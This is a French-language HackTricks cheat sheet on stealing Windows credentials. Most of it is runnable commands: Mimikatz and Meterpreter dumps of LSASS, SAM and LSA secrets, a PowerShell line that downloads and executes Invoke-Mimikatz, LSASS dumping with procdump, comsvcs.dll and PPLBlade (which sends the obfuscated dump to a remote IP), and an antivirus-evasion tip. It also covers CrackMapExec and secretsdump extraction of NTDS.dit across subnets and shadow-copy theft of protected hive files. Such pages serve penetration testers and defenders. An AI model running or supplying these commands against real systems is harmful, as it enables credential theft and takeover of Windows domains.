# Vol de crédentiels Windows

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez les [**produits dérivés officiels PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Crédentiels Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Apprenez-en plus sur certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Plugin Credentials**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hashes** à l'intérieur de la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement de l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **vider le processus lsass**, **télécharger le vidage** et **extraire** les **identifiants localement** à partir du vidage.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz) : `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque** : Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour vider lsass.exe**, car ils **détectent** la chaîne de caractères **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** **nom lsass.exe.**

### Vidage de lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll** trouvée dans `C:\Windows\System32` est responsable du **vidage de la mémoire du processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée en utilisant `rundll32.exe`.\
Il est inutile d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. L'ID du processus à vider constitue le premier composant, l'emplacement du fichier de vidage représente le deuxième, et le troisième composant est strictement le mot **full**. Aucune autre option n'existe.\
Après avoir analysé ces trois composants, la DLL est engagée dans la création du fichier de vidage et le transfert de la mémoire du processus spécifié dans ce fichier.\
L'utilisation de **comsvcs.dll** est faisable pour vider le processus lsass, éliminant ainsi le besoin de télécharger et d'exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

La commande suivante est utilisée pour l'exécution :
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec le Gestionnaire des tâches**

1. Faites un clic droit sur la barre des tâches et cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processus
4. Faites un clic droit sur le processus "Local Security Authority Process" et cliquez sur "Créer un fichier de vidage".

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des vidages de mémoire et leur transfert sur des postes de travail distants sans les déposer sur le disque.

**Fonctionnalités clés** :

1. Contournement de la protection PPL
2. Obfuscation des fichiers de vidage de mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
3. Téléchargement de vidage de mémoire avec des méthodes de téléchargement RAW et SMB sans les déposer sur le disque (vidage sans fichier)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

### Description

Cette technique permet de récupérer des informations sensibles stockées dans le Local Security Authority (LSA) sur les systèmes Windows. Les secrets LSA peuvent inclure des mots de passe en texte clair, des informations d'authentification et d'autres données sensibles.

### Utilisation

```bash
# Utilisation de mimikatz pour dumper les secrets LSA
mimikatz # sekurlsa::secrets
```

### Précautions

- Assurez-vous d'avoir les autorisations nécessaires pour exécuter cette technique.
- Soyez conscient que l'exécution de cette technique peut déclencher des alertes de sécurité.

### Références

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [LSA Secrets](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management)
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extraire le NTDS.dit du DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe NTDS.dit du DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Vol de SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.

### Depuis le Registre

La manière la plus simple de voler ces fichiers est d'obtenir une copie depuis le registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extraites les hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie des fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin est uniquement disponible dans les versions Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est sauvegardé dans C:\users\Public) mais vous pouvez utiliser cela pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Le fichier **NTDS.dit** est connu comme le cœur de **Active Directory**, contenant des données cruciales sur les objets utilisateurs, les groupes et leurs adhésions. C'est là que les **hashs de mots de passe** des utilisateurs du domaine sont stockés. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Data Table** : Cette table est chargée de stocker des détails sur des objets comme les utilisateurs et les groupes.
- **Link Table** : Elle garde une trace des relations, telles que les adhésions aux groupes.
- **SD Table** : Les **descripteurs de sécurité** pour chaque objet sont conservés ici, assurant la sécurité et le contrôle d'accès pour les objets stockés.

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait être située **à l'intérieur de la mémoire `lsass`** (vous pouvez trouver les données les plus récemment accédées probablement en raison de l'amélioration des performances par l'utilisation d'un **cache**).

#### Déchiffrer les hashs à l'intérieur de NTDS.dit

Le hash est chiffré 3 fois :

1. Déchiffrer la clé de chiffrement de mot de passe (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Déchiffrer le **hash** en utilisant **PEK** et **RC4**.
3. Déchiffrer le **hash** en utilisant **DES**.

**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les identifiants du fichier NTDS.dit **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copier NTDS.dit en utilisant Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser l'astuce [**volume shadow copy**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Extraction des hashes de NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur admin de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit**, il est recommandé de les extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi les objets entiers et leurs attributs pour une extraction d'informations plus approfondie lorsque le fichier NTDS.dit brut est déjà récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (hashes NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, les clés kerberos ou de confiance, les historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatage de la dernière connexion et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...

## Lazagne

Téléchargez le binaire depuis [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des identifiants de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire des identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement et les mots de passe seront extraits.

## Défenses

[**Apprenez-en plus sur certaines protections des identifiants ici.**](credentials-protections.md)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir **votre entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
